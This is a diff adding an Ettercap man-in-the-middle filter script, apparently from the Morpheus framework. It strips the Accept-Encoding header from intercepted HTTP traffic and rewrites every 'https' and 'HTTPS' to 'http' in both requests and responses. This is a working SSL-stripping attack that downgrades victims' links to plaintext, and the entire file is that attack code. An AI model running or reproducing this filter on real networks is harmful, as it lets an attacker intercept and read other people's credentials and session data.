@@ -1,0 +1,60 @@
+############################################################################
+#                                                                          #
+#  HTTPS Request/Response Filter                                           #
+#  based on code from ALoR & NaGA                                          #
+#                                                                          #
+#  This program is free software; you can redistribute it and/or modify    #
+#  it under the terms of the GNU General Public License as published by    #
+#  the Free Software Foundation; either version 2 of the License, or       #
+#  (at your option) any later version.                                     #
+#                                                                          #
+############################################################################
+
+##
+#  This filter will substitute the word 'https' with 'http' on
+#  both HTTP requests and responses.
+##
+
+
+##########################
+## Zap Content Encoding ##
+##########################
+if (ip.proto == TCP && tcp.dst == 80) {
+   if (search(DATA.data, "Accept-Encoding")) {
+      replace("Accept-Encoding", "Accept-Rubbish!"); 
+	# note: replacement string is same length as original string
+        msg("[Morpheus] Encoding zapped.\n");
+   }
+}
+
+#####################
+## Replace Content ##
+#####################
+
+##
+# Requests
+if (ip.proto == TCP && tcp.dst == 80) {
+  msg("[Morpheus] HTTP request seen.");
+   if (search(DECODED.data, "https")){
+      replace("https", "http"); 
+      msg("[Morpheus] https zapped from request!\n");
+   }
+   if (search(DATA.data, "HTTPS")){
+      replace("HTTPS", "HTTP");
+      msg("[Morpheus] HTTPS zapped from request!\n"); 
+   }
+}
+
+##
+# Response
+if (ip.proto == TCP && tcp.src == 80) {
+  msg("[Morpheus] HTTP response seen.");
+   if (search(DECODED.data, "https")){
+      replace("https", "http"); 
+      msg("[HTTP Response Filter] *** HTTPS ZAPPED from response\n");
+   }
+   if (search(DATA.data, "HTTPS")){
+      replace("HTTPS", "HTTP"); 
+      msg("[HTTP Response Filter] *** HTTPS ZAPPED from response\n");
+   }
+}
